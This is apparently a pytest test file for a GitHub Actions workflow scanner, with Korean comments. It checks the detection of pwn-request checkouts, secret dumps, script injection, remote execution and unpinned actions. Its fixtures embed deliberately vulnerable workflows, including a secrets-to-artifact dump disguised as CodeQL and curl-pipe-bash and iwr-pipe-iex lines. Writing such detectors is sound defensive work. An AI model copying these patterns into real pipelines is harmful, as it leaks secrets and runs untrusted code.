"""38차 — GitHub Actions 워크플로 판정(ci-workflow).

2026-03 Trivy · 2026-05 TanStack · 2026 prt-scan: pull_request_target 으로 저장소 권한을 가진 채 PR 코드를 실행했다.
문자열 하나로 차단하지 않는다 — 트리거·체크아웃 ref·이후 실행·권한을 묶어 본다.
"""
from __future__ import annotations

from pathlib import Path

from gvskb.scanner import scan_path
from gvskb.scanners.ci_workflow import (
    RULE_PERMISSIONS,
    RULE_PWN_REQUEST,
    RULE_REMOTE_EXEC,
    RULE_SCRIPT_INJECTION,
    RULE_SECRETS_DUMP,
    RULE_UNPINNED_ACTION,
)

REPO = Path(__file__).resolve().parent.parent


def _wf(tmp_path: Path, text: str, name: str = "ci.yml") -> Path:
    p = tmp_path / ".github" / "workflows" / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    (tmp_path / "README.md").write_text("x\n", encoding="utf-8")
    return tmp_path


def _by(report, rule_id):
    return [f for f in report.findings if f.rule_id == rule_id]


PWN = """\
name: build-pr
on:
  pull_request_target:
    types: [opened, synchronize]
permissions:
  contents: write
  pull-requests: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm test
"""


def test_pwn_request_with_execution_is_confirmed_block(tmp_path: Path) -> None:
    r = scan_path(_wf(tmp_path, PWN))
    hits = _by(r, RULE_PWN_REQUEST)
    assert len(hits) == 1
    f = hits[0]
    assert f.confidence == "confirmed" and f.decision.value == "block" and f.engine == "ci-workflow"
    assert "pull_request_target" in f.evidence and "체크아웃" in f.evidence and "실행" in f.evidence
    assert "쓰기 권한" in f.evidence and "캐시" in f.evidence
    # 권한 과다 + EOL Node 20 도 함께 보인다(각각 다른 룰).
    assert _by(r, RULE_PERMISSIONS)
    assert any(f.rule_id == "GOV-RUNTIME-EOL-001" for f in r.findings)


def test_pwn_request_checkout_without_execution_is_only_likely(tmp_path: Path) -> None:
    wf = PWN.replace("      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: npm\n", "") \
            .replace("      - run: npm ci\n      - run: npm test\n", "      - uses: actions/upload-artifact@v4\n        with:\n          path: .\n")
    r = scan_path(_wf(tmp_path, wf))
    hits = _by(r, RULE_PWN_REQUEST)
    assert len(hits) == 1 and hits[0].confidence == "likely" and hits[0].decision.value == "warn"


def test_label_only_pull_request_target_is_clean(tmp_path: Path) -> None:
    wf = """\
on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9
"""
    r = scan_path(_wf(tmp_path, wf))
    assert not _by(r, RULE_PWN_REQUEST)
    assert not _by(r, RULE_UNPINNED_ACTION), "SHA 고정 액션은 잡지 않는다"
    # pull_request_target + pull-requests: write 는 권한 검토 신호(경고)로만 남는다.
    assert all(f.decision.value == "warn" for f in r.findings)


def test_secrets_dump_is_confirmed(tmp_path: Path) -> None:
    wf = """\
name: CodeQL Analysis
on: push
jobs:
  run-copilot:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(secrets) }}' > format-results.txt
      - uses: actions/upload-artifact@v4
        with:
          path: format-results.txt
"""
    r = scan_path(_wf(tmp_path, wf, "codeql_analysis.yml"))
    hits = _by(r, RULE_SECRETS_DUMP)
    assert len(hits) == 1 and hits[0].confidence == "confirmed" and hits[0].decision.value == "block"


def test_named_secret_in_env_is_clean(tmp_path: Path) -> None:
    wf = """\
on: push
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"""
    r = scan_path(_wf(tmp_path, wf))
    assert r.findings == []


def test_script_injection_of_pr_title_is_confirmed_but_env_form_is_clean(tmp_path: Path) -> None:
    bad = """\
on: pull_request
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: echo "PR ${{ github.event.pull_request.title }}"
"""
    good = bad.replace('echo "PR ${{ github.event.pull_request.title }}"',
                       'echo "PR $PR_TITLE"\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}')
    r = scan_path(_wf(tmp_path, bad))
    hits = _by(r, RULE_SCRIPT_INJECTION)
    assert len(hits) == 1 and hits[0].confidence == "confirmed" and "pull_request.title" in hits[0].evidence
    r2 = scan_path(_wf(tmp_path, good))
    assert not _by(r2, RULE_SCRIPT_INJECTION)


def test_dispatch_inputs_free_text_is_likely_but_choice_is_clean(tmp_path: Path) -> None:
    wf = """\
on:
  workflow_dispatch:
    inputs:
      channel:
        type: choice
        options: [test, prod]
      note:
        type: string
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ inputs.channel }}"
      - run: echo "${{ inputs.note }}"
"""
    r = scan_path(_wf(tmp_path, wf))
    hits = _by(r, RULE_SCRIPT_INJECTION)
    assert len(hits) == 1 and hits[0].confidence == "likely" and "inputs.note" in hits[0].evidence


def test_remote_exec_curl_pipe_sh_is_confirmed(tmp_path: Path) -> None:
    wf = """\
on: push
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://get.example.com/install.sh | sudo bash
      - run: iwr https://x.example/i.ps1 | iex
        shell: pwsh
"""
    r = scan_path(_wf(tmp_path, wf))
    hits = _by(r, RULE_REMOTE_EXEC)
    assert len(hits) == 2 and all(h.confidence == "confirmed" for h in hits)


def test_unpinned_third_party_action_is_warn_and_official_is_exempt(tmp_path: Path) -> None:
    wf = """\
on: push
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
      - uses: peter-evans/create-pull-request@v6
      - uses: someone/thing@main
      - uses: ./.github/actions/local
      - uses: docker://alpine:3.20
"""
    r = scan_path(_wf(tmp_path, wf))
    hits = _by(r, RULE_UNPINNED_ACTION)
    assert sorted("@main" in h.evidence for h in hits) == [False, True]
    assert all(h.decision.value == "warn" and h.confidence == "likely" for h in hits)
    assert any("태그" in h.evidence for h in hits) and any("가변 브랜치" in h.evidence for h in hits)


def test_write_all_and_self_hosted_fork_are_warnings(tmp_path: Path) -> None:
    wf = """\
on: pull_request
permissions: write-all
jobs:
  t:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v4
      - run: make test
"""
    r = scan_path(_wf(tmp_path, wf))
    hits = _by(r, RULE_PERMISSIONS)
    evid = " | ".join(h.evidence for h in hits)
    assert "write-all" in evid and "self-hosted" in evid
    assert all(h.decision.value == "warn" for h in hits)


def test_repo_own_workflows_and_example_template_are_clean() -> None:
    """개밥먹기 — 이 저장소의 워크플로 4개와 배포 예시 템플릿은 모두 경고 없이 통과해야 한다."""
    r = scan_path(REPO / ".github" / "workflows")
    ci = [(f.location.file, f.rule_id, f.evidence[:80]) for f in r.findings if f.engine == "ci-workflow"]
    assert ci == [], ci
    r2 = scan_path(REPO / "examples" / "github-actions")
    assert [f.rule_id for f in r2.findings if f.engine == "ci-workflow"] == []


def test_yaml_on_key_parsed_as_boolean_true_is_handled(tmp_path: Path) -> None:
    # YAML 1.1 은 `on:` 을 불리언 True 키로 읽는다 — 트리거 해석이 이를 놓치면 pwn request 를 전부 놓친다.
    r = scan_path(_wf(tmp_path, PWN.replace("on:\n  pull_request_target:\n    types: [opened, synchronize]", "on: [pull_request_target]")))
    assert _by(r, RULE_PWN_REQUEST)
